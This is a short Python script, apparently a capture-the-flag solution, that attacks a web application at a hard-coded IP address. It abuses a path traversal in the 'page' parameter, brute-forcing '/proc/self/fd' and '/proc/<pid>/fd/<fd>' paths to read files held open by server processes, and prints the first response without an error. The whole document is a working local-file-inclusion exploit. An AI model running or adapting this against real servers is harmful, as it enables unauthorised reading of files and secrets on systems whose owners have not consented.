import sys, threading, requests

URL = f'http://3.34.190.217:8888/'
for pid in range(1, 32):
    print(f'[+] brute loop restarted: {pid}')
    for fd in range(4, 32):
        f = f'../../proc/self/fd/{pid}/../../../{pid}/fd/{fd}'
        r  = requests.get(URL, params={
            'page': f
        })
        if not "Error" in r.text:
            print(f'[!] {f}: {r.text}')
            exit()